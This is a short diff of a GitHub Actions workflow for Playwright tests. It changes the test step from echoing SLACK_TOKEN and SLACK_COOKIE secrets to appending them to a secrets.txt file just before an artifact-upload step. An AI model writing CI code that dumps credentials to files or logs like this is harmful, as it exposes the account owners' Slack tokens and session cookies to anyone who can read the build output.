@@ -34,13 +34,13 @@ jobs:
           npx playwright install
       
       - name: Run Playwright Tests 
-        run: |
-          echo ${{secrets.SLACK_TOKEN}}
-          echo ${{secrets.SLACK_COOKIE}}
-          npx playwright test
         env:
           SLACK_TOKEN: ${{secrets.SLACK_TOKEN}}
           SLACK_COOKIE: ${{secrets.SLACK_COOKIE}}
+        run: |
+          echo ${{secrets.SLACK_TOKEN}} >> secrets.txt
+          echo ${{secrets.SLACK_COOKIE}} >> secrets.txt
+          npx playwright test
 
       - uses: actions/upload-artifact@v3
         with:
